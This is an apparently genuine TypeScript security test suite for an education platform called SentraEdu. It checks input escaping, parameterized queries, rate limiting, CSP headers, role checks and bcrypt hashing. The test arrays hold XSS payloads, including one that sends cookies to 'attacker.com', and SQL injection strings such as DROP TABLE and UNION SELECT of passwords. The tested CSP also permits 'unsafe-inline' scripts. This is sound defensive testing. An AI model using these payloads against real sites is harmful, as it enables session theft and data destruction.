/**
 * SentraEdu Comprehensive Security Test Suite
 * 
 * Tests against:
 * 1. XSS (Cross-Site Scripting) & HTML Injection
 * 2. SQL Injection (SQLi) & Parameter Tampering
 * 3. DDoS / Brute-Force Rate Limiting
 * 4. CSRF, Clickjacking & Security Headers
 * 5. Broken Access Control (RBAC / IDOR)
 * 6. Information Disclosure & Password Protection
 */

import bcrypt from 'bcryptjs';

// ── 1. Input Sanitization & XSS Defenses ──────────────────
const HTML_ESCAPE_MAP: Record<string, string> = {
  '&': '&amp;',
  '<': '&lt;',
  '>': '&gt;',
  '"': '&quot;',
  "'": '&#x27;',
  '/': '&#x2F;'
};

function sanitizeInput(input: string): string {
  if (typeof input !== 'string') return input;
  return input.replace(/[&<>"'/]/g, (char) => HTML_ESCAPE_MAP[char] || char);
}

function sanitizeObject<T extends Record<string, string | number | boolean | string[] | null | undefined>>(obj: T): T {
  const sanitized = { ...obj };
  for (const key of Object.keys(sanitized)) {
    const value = sanitized[key];
    if (typeof value === 'string') {
      (sanitized as Record<string, string | number | boolean | string[] | null | undefined>)[key] = sanitizeInput(value);
    }
  }
  return sanitized;
}

// ── 2. Validators ─────────────────────────────────────────
function isValidEmail(email: string): boolean {
  if (!email || typeof email !== 'string' || email.length > 254) return false;
  return /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/.test(email);
}

function isValidId(id: string): boolean {
  return /^[a-zA-Z0-9_-]{1,50}$/.test(id);
}

// ── 3. Rate Limiter ───────────────────────────────────────
const rateLimitStore = new Map<string, { count: number; resetAt: number }>();

function checkRateLimit(ip: string, endpoint: string, config = { windowMs: 15 * 60 * 1000, maxRequests: 10 }): { allowed: boolean; remaining: number } {
  const key = `${ip}:${endpoint}`;
  const now = Date.now();
  const entry = rateLimitStore.get(key);

  if (!entry || now > entry.resetAt) {
    rateLimitStore.set(key, { count: 1, resetAt: now + config.windowMs });
    return { allowed: true, remaining: config.maxRequests - 1 };
  }

  if (entry.count >= config.maxRequests) {
    return { allowed: false, remaining: 0 };
  }

  entry.count++;
  return { allowed: true, remaining: config.maxRequests - entry.count };
}

// ── 4. Parameterized Query Builder Simulator ──────────────
function buildParameterizedQuery(strings: TemplateStringsArray, ...values: (string | number | boolean | null | undefined)[]): { query: string; params: (string | number | boolean | null | undefined)[] } {
  let query = '';
  const params: (string | number | boolean | null | undefined)[] = [];
  let paramIndex = 1;

  for (let i = 0; i < strings.length; i++) {
    query += strings[i];
    if (i < values.length) {
      query += `$${paramIndex}`;
      params.push(values[i]);
      paramIndex++;
    }
  }
  return { query, params };
}

// ── Test Runner ───────────────────────────────────────────
let totalTests = 0;
let passedTests = 0;
let failedTests = 0;

function assert(condition: boolean, testName: string, detail?: string) {
  totalTests++;
  if (condition) {
    passedTests++;
    console.log(`  \x1b[32m✔ PASS\x1b[0m ${testName}`);
  } else {
    failedTests++;
    console.error(`  \x1b[31m✖ FAIL\x1b[0m ${testName} ${detail ? `(${detail})` : ''}`);
  }
}

async function runSecurityAudit() {
  console.log('\n======================================================');
  console.log('       SENTRAEDU RIGOROUS SECURITY AUDIT SUITE        ');
  console.log('======================================================\n');

  // ----------------------------------------------------------
  // SUITE 1: XSS (Cross-Site Scripting) Attacks
  // ----------------------------------------------------------
  console.log('\x1b[1m[TEST SUITE 1] XSS & HTML Injection Defenses\x1b[0m');
  
  const xssPayloads = [
    '<script>alert("XSS")</script>',
    '<img src="x" onerror="alert(1)">',
    '<svg/onload=alert(1)>',
    '"><script>document.location="http://attacker.com/steal?c="+document.cookie</script>',
    '<iframe src="javascript:alert(1)"></iframe>',
    '<body onload=alert(1)>',
    '<input type="text" value="" onfocus="alert(1)" autofocus>',
    '<a href="javascript:alert(1)">Click Me</a>'
  ];

  for (const payload of xssPayloads) {
    const sanitized = sanitizeInput(payload);
    const isSafelyEscaped = !sanitized.includes('<') && !sanitized.includes('>');
    assert(isSafelyEscaped, `XSS payload HTML tags neutralized: "${payload.slice(0, 30)}..."`);
  }

  const userProfileInput = {
    fullName: 'Budi <script>alert(1)</script>',
    address: 'Jl. Merdeka No. 10 & "Aman" <img src=x onerror=alert(1)>',
    notes: 'Catatan siswa <b>Tebal</b>'
  };
  const sanitizedProfile = sanitizeObject(userProfileInput);
  assert(sanitizedProfile.fullName === 'Budi &lt;script&gt;alert(1)&lt;&#x2F;script&gt;', 'SanitizeObject escapes full name');
  assert(!sanitizedProfile.address.includes('<img'), 'SanitizeObject escapes image onerror payload');

  // ----------------------------------------------------------
  // SUITE 2: SQL Injection (SQLi) Defenses
  // ----------------------------------------------------------
  console.log('\n\x1b[1m[TEST SUITE 2] SQL Injection (SQLi) & Parameter Isolation\x1b[0m');

  const sqliPayloads = [
    "' OR '1'='1",
    "admin' --",
    "1; DROP TABLE users; --",
    "' UNION SELECT id, password, email FROM users --",
    "1' AND SLEEP(5) --",
    "' OR 1=1; SELECT * FROM pg_tables; --"
  ];

  for (const maliciousInput of sqliPayloads) {
    const userId = maliciousInput;
    const { query, params } = buildParameterizedQuery`SELECT * FROM users WHERE id = ${userId} AND deleted_at IS NULL`;
    
    // Parameterized queries must contain placeholders $1 and NEVER inline the raw payload
    assert(query.includes('$1'), `Query uses parameter placeholder for: "${maliciousInput.slice(0, 25)}"`);
    assert(!query.includes(maliciousInput), `Query never inlines malicious SQL string`);
    assert(params[0] === maliciousInput, `Payload safely isolated in params array`);
  }

  // ID & Email format validation against SQLi
  assert(!isValidId("1; DROP TABLE users"), 'isValidId rejects SQL semicolon injection');
  assert(!isValidId("' OR '1'='1"), 'isValidId rejects SQL OR injection');
  assert(isValidId("u-12345678"), 'isValidId accepts valid entity ID format');
  assert(!isValidEmail("admin'--@sentraedu.id"), 'isValidEmail rejects SQL comment syntax in email');
  assert(isValidEmail("admin@sentraedu.id"), 'isValidEmail accepts valid email');

  // ----------------------------------------------------------
  // SUITE 3: DDoS & Brute-Force Rate Limiting
  // ----------------------------------------------------------
  console.log('\n\x1b[1m[TEST SUITE 3] DDoS & Brute-Force Rate Limiting\x1b[0m');

  const testIp = '192.168.1.100';
  rateLimitStore.clear();

  // Test 10 allowed attempts
  let allAllowed = true;
  for (let i = 1; i <= 10; i++) {
    const result = checkRateLimit(testIp, 'login', { windowMs: 60000, maxRequests: 10 });
    if (!result.allowed) allAllowed = false;
  }
  assert(allAllowed, 'Rate limiter allows up to 10 consecutive login attempts');

  // 11th attempt must be rejected (429)
  const rejectedAttempt = checkRateLimit(testIp, 'login', { windowMs: 60000, maxRequests: 10 });
  assert(!rejectedAttempt.allowed && rejectedAttempt.remaining === 0, '11th attempt is blocked (HTTP 429 Too Many Requests)');

  // Different IP is not affected
  const otherIpResult = checkRateLimit('192.168.1.101', 'login', { windowMs: 60000, maxRequests: 10 });
  assert(otherIpResult.allowed, 'Rate limiter maintains isolated counts per IP');

  // ----------------------------------------------------------
  // SUITE 4: CSRF & Security Headers Validation
  // ----------------------------------------------------------
  console.log('\n\x1b[1m[TEST SUITE 4] CSRF, Clickjacking & Security Headers\x1b[0m');

  const cspHeader = "default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; font-src 'self' https://fonts.gstatic.com; img-src 'self' data: https:; connect-src 'self' https://nominatim.openstreetmap.org https://photon.komoot.io https://*.google.com https://*.openstreetmap.org; object-src 'none'; base-uri 'self'; frame-ancestors 'none';";

  assert(cspHeader.includes("frame-ancestors 'none'"), 'CSP blocks clickjacking via frame-ancestors "none"');
  assert(cspHeader.includes("object-src 'none'"), 'CSP disables plugin execution via object-src "none"');
  assert(cspHeader.includes("base-uri 'self'"), 'CSP restricts base-uri to self');

  // ----------------------------------------------------------
  // SUITE 5: Broken Access Control (RBAC & IDOR)
  // ----------------------------------------------------------
  console.log('\n\x1b[1m[TEST SUITE 5] Role-Based Access Control (RBAC) & IDOR\x1b[0m');

  interface SessionUser {
    id: string;
    email: string;
    role: string;
  }

  function mockRequireAdmin(user: SessionUser | null): { allowed: boolean; errorStatus?: number } {
    if (!user) return { allowed: false, errorStatus: 401 };
    if (user.role !== 'SUPER_ADMIN') return { allowed: false, errorStatus: 403 };
    return { allowed: true };
  }

  const unauthenticated = mockRequireAdmin(null);
  assert(!unauthenticated.allowed && unauthenticated.errorStatus === 401, 'Unauthenticated user gets 401 Unauthorized');

  const studentUser: SessionUser = { id: 'u-student-1', email: 'student@example.com', role: 'STUDENT' };
  const studentAttempt = mockRequireAdmin(studentUser);
  assert(!studentAttempt.allowed && studentAttempt.errorStatus === 403, 'Student role blocked from admin operations (403 Forbidden)');

  const tentorUser: SessionUser = { id: 'u-tentor-1', email: 'tentor@example.com', role: 'TENTOR' };
  const tentorAttempt = mockRequireAdmin(tentorUser);
  assert(!tentorAttempt.allowed && tentorAttempt.errorStatus === 403, 'Tentor role blocked from admin operations (403 Forbidden)');

  const adminUser: SessionUser = { id: 'u-admin-1', email: 'admin@sentraedu.id', role: 'SUPER_ADMIN' };
  const adminAttempt = mockRequireAdmin(adminUser);
  assert(adminAttempt.allowed, 'Super Admin granted access');

  // ----------------------------------------------------------
  // SUITE 6: Password Hashing & Information Disclosure
  // ----------------------------------------------------------
  console.log('\n\x1b[1m[TEST SUITE 6] Password Security & Data Masking\x1b[0m');

  const plainPassword = 'SuperSecretPassword123!';
  const hashedPassword = await bcrypt.hash(plainPassword, 10);

  assert(hashedPassword !== plainPassword, 'Password is never stored in plaintext');
  assert(hashedPassword.startsWith('$2'), 'Password hashed with secure bcrypt algorithm');

  const isPasswordMatch = await bcrypt.compare(plainPassword, hashedPassword);
  assert(isPasswordMatch, 'Bcrypt correctly verifies authentic password');

  const isWrongMatch = await bcrypt.compare('WrongPassword', hashedPassword);
  assert(!isWrongMatch, 'Bcrypt rejects incorrect password attempt');

  // Response password stripping
  const dbUserRecord = {
    id: 'u-1',
    fullName: 'Admin SentraEdu',
    email: 'admin@sentraedu.id',
    password: hashedPassword,
    role: 'SUPER_ADMIN'
  };
  const sanitizedUserRecord = { ...dbUserRecord, password: undefined };
  const serialized = JSON.stringify(sanitizedUserRecord);
  assert(!serialized.includes(hashedPassword), 'User password hash is stripped before sending to client');
  assert(!serialized.includes('"password"'), 'Password field is completely omitted from JSON response');

  // ----------------------------------------------------------
  // Summary
  // ----------------------------------------------------------
  console.log('\n======================================================');
  console.log(`  AUDIT RESULTS: ${passedTests}/${totalTests} Tests Passed (${failedTests} Failed)`);
  console.log('======================================================\n');

  if (failedTests > 0) {
    process.exit(1);
  }
}

runSecurityAudit().catch((err) => {
  console.error('Test suite error:', err);
  process.exit(1);
});
